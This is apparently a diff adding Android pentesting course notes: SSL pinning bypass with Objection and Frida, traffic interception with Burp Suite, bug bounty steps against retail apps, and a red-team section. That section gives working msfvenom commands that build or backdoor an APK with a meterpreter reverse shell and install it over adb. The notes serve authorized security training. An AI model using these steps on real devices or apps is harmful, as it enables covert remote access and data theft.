@@ -377,39 +377,226 @@ Example:
 
 ### Intro to SSL Pinning/Dynamic Analysis
 
+About SSL Pinning
+
+* SSL Pinning is a security methodology utilized to ensure that application traffic is not being intercepted (Man-In-The-Middle)
+  * Some mobile applications VERIFY that the received traffic is coming from a KNOWN certificate
+  * We can import a certificate into the phone as a root or user certificate, but it STILL might not be trusted by the application
+  * This can cause our application to crash when we try to intercept the network traffic
+* From a pentester perspective, this can make our job a bit harder. We want to see live application traffic, see parameters passed and edit them if possible.
+
+A Tale of Two Proxies
+
+* Burp Suite
+  * Proxy too with a lot of built-in penetration testing tools
+  * Can be used for iOS and Android
+  * Will be our last resort in iOS with a jailbroken device (Burp Mobile Assistant)
+* Proxyman
+  * Newer tool that works only on MacOS, but it has the ability to easily import it's certificate into the Mac Keychain and intercept application traffic
+  * Can be used for iOS and Android
+* Other options mitmproxy, charles proxy, fiddler, etc.
+
+Android Interception Process
+
+1. Start proxy software (burp Suite or Proxyman)
+2. Configure Proxy Software
+3. Set proxy of the emulator (or wifi settings for a physical device)
+4. Intercept HTTP traffic
+5. Import CA certificate
+6. Trust CA Certificate in Android Certificate Store
+7. Intercept HTTPS Traffic = Profit?! (or be shamed by SSL Pinning)
+8. If shamed by SSL Pinning, try Objection/Frida
+
 ### Dynamic Analysis Using MobSF
 
-### Burp Suite Install and Overview
+[https://mobsf.github.io/docs/#/dynamic\_analyzer?id=android-studio-emulator](https://mobsf.github.io/docs/#/dynamic\_analyzer?id=android-studio-emulator)
+
+<pre class="language-bash"><code class="lang-bash"># List available Android Virtual Devices (AVD)
+emulator -list-avds  
+# Run Android Virtual Device (AVD)
+emulator -avd Pixel_6_Pro_API_33 -writable-system -no-snapshot
+# Start MobSF (http://localhost:8000)
+<strong>Mobile-Security-Framework-MobSF>run.bat
+</strong></code></pre>
+
+From MobSF, upload & analyze a package
 
 ### Burp Suite Setup/Intercept
 
-### Proxyman Install & Usage
+* In Burp Suite, from the Proxy --> Options tab, set address to All interface and set a port.
+* From emulator, select the ellipsis --> Settings --> Proxy --> Manual proxy configuration and enter in 127.0.0.1 and the port configured in Burp Suite.
+* Navigate to a website from the browser on the Android phone and we'll see a security certificate error.
+  * Select View Certificate and you'll see is it the PortSwigger CA (from Burp Suite)
+* To trust the certificate it needs to be imported into the phone
+  * From Burp Suite, from the Proxy --> Options tab, select the Import/export CA certificate --> select Certificate in DER format --> Next --> Select file --> and save as \<NAME>.CER (adding the CER extension) --> Save --> Next, and now the certificate is on the machine.
+    * Can just drag and drop the .CER file to the phone
+  * From the emulator, select Settings --> select/search on Security --> and figure out how to import the certificate.
 
 ### Patching Applications Automatically Using Objection
 
+[https://github.com/sensepost/objection](https://github.com/sensepost/objection)
+
+```bash
+pip3 install frida-tools
+> frida
+pip3 install objection
+> objection
+```
+
+Path the APK file
+
+```bash
+objection patchapk --source injuredAndroid_pulled.apk
+# Will create a new objection.apk file
+# Delete the existing injuredAndroid application from the emulator
+# Drag and drop the new apk file into the emulator to install
+# May get a Failure for no certificates...may need to do manual patching
+```
+
 ### Patching Applications Manually
+
+[https://frida.re/docs/android/](https://frida.re/docs/android/), [https://github.com/frida/frida](https://github.com/frida/frida)
+
+[https://koz.io/using-frida-on-android-without-root/](https://koz.io/using-frida-on-android-without-root/)
+
+Process to Follow:
+
+* Decompile Source Code: `apkool d -r <target.apk>`
+* Download frida-gadget for your CPU Architecture from GitHub releases
+* Unzip File, and rename file to frida-gadget.so
+* Inject Frida-gadget into Android App under: /lib/\<CPUArch-For-Your-Device>
+* Save As: libfrida-gadget.so
+* Add reference to frida-gadget to SMALI code, in a known exported activity or otherwise accessible Activity (usually MainActivity.smali, or OnboardingActivity.smali): const-string v0, "frida-gadget" invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
+* Recompile Application: `apktool b <target.apk> -o <output_file.apk>` (in this case target.apk points to the folder you decompiled in step #1)
+* Sign with your key, and zipalign the app
 
 ### Dynamic Analysis - Final Notes and Vectors
 
+Other Objection commands to look into:
+
+```bash
+android clipboard monitor
+memory dump all
+android heap
+sqlite connect
+android hook
+android intent
+android keystore list
+android root simulate
+android sslpinning disable
+```
+
 ### The Frida Codeshare
+
+[https://codeshare.frida.re/](https://codeshare.frida.re/)
 
 ### Using Frida Codeshare & Startup Scripts
 
+Recommended Frida Code Share Scripts:
+
+* Universal SSL Pinning Bypass: [https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/](https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/)
+* Frida Antiroot: [https://codeshare.frida.re/@dzonerzy/fridantiroot/](https://codeshare.frida.re/@dzonerzy/fridantiroot/)
+
 ### Common Issues: Can't Decode Resources
+
+Common issue thread on GitHub: [https://github.com/iBotPeaches/Apktool/issues/1776](https://github.com/iBotPeaches/Apktool/issues/1776)
 
 ## Android Bug Bounty Hunt
 
 ### Joann Fabrics
 
+1. From Android Studio Emulator select the Play Store and Install the application
+2. Start adb shell: `adb shell`
+   1. `pm list packages | grep joann`
+   2. `pm path com.fifthfinger.clients.joann`
+      1. Copy the path from the output
+   3. `exit`
+3. `adb pull <PATH FROM THE OUTPUT> joann.apk`
+4. Open up the APK file in jadx-gui
+   1. AndroidManifest.xml
+      1. Search on interesting information
+      2. Look for APIs and API keys
+   2. common.properties
+   3. strings.xml
+   4. Other XML files and the Text search magnifying glass
+5. Intercept interactions with the app with Burp Suite
+   1. If getting SSL errors, use objection like below
+6. Try to patch the application with Objection
+   1. `objection patchapk --source joann.apk`
+   2. Uninstall application from Android emulator
+   3. Install new joann APK file (joann.objection.apk) onto the Android emulator
+      1. `adb install joann.objection.apk`
+7. If Objection doesn't work, the manual application patching will have to be done
+8. Then use Objection again
+   1. `objection explore`
+   2. `android sslpinning disable`
+      1. And now we should be able to intercept traffic with Burp Suite
+
 ### Sam's Club App
+
+1. From Android Studio Emulator select the Play Store and Install the application
+2. Start adb shell: `adb shell`
+   1. `pm list packages | grep sams`
+   2. `pm path com.rfi.sams.android`
+      1. Copy the path from the output
+   3. `exit`
+3. `adb pull <PATH FROM THE OUTPUT>`
+4. Open up the APK file in jadx-gui
+   1. AndroidManifest.xml
+   2. common.properties
+   3. strings.xml
+5. Intercept interactions with the app with Burp Suite
 
 ## BONUS - Android Red Teaming
 
 ### In-Line Attacks
 
+Hak5 O.M.G Cable: [https://shop.hak5.org/products/o-mg-cable-usb-a](https://shop.hak5.org/products/o-mg-cable-usb-a)
+
+Hacker Warehouse: [https://hackerwarehouse.com/product/usb-ninja-cable/](https://hackerwarehouse.com/product/usb-ninja-cable/)
+
 ### Creating a Generic APK with Metasploit Shell
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<> LPORT=<> R> android.apk
+# Application signing process
+keytool -genkey -V -keystore key.keystore -alias keystore -keyalg RSA -keysize 2048 -validity 10000
+# Sign the jar
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk keystore
+# Zip Align
+zipalign -v 4 android.apk hackedapp.apk
+```
+
+<pre class="language-bash"><code class="lang-bash"><strong># Install the malicious APK file
+</strong><strong>adb H &#x3C;IP> -P 5037 install hackedapp.apk
+</strong># Start a meterpreter listener
+msf5 exploit(multi/handler) > run
+# Run malicious APK file from the emulator
+</code></pre>
 
 ### Injecting Play Store App with Metasploit Shell
 
+```bash
+adb -H <IP> -P 5037 shell
+pm list packages | grep injured
+# Copy package name output
+pm path <Package name output>
+# Copy the of this output
+exit
+adb -H <IP> -P 5037 pull <Path output> injured.apk
+msfvenom -x injured.apk -p android/meterpreter/reverse_tcp LHOST=<> LPORT=<> -o InjuredMSF.apk
+# Uninstall old app from emulator
+# Install new malicious app to emulator
+adb -H <IP> -P 5037 install InjuredMSF.apk
+# Start a meterpreter listener
+msf5 exploit(multi/handler) > run
+# Run malicous app from the emulator
+```
+
+If you are interested in exploiting an app manually I highly suggest following this article from Black Hills Infosec: [https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)
+
 ### The Ghost Framework
 
+[https://github.com/kp-forks/ghost-1](https://github.com/kp-forks/ghost-1)
+
+Extra Video from HackerLoi showing him using Ghost Framework on a Android Phone:[ https://www.youtube.com/watch?v=0eAafqElwik](https://www.youtube.com/watch?v=0eAafqElwik)
